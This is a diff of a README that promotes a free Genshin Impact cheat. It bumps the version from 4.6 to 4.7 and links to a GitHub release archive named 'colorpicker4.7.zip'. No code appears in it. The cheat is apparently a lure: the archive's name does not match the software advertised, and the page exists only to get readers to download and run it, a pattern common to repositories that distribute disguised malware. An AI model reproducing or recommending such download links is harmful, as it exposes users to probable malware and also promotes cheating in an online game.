@@ -1,6 +1,6 @@
-## Free Genshin Impact cheat 4.6 version updated!
+## Free Genshin Impact cheat 4.7 version updated!
 
-## Download - [Click here](https://github.com/NotASimpleSponge/Korepi-4.6/releases/download/KP/colorpicker4.6.zip)
+## Download - [Click here](https://github.com/NotASimpleSponge/Korepi-4.6/releases/download/KP/colorpicker4.7.zip)
 
 ## Change log 
 
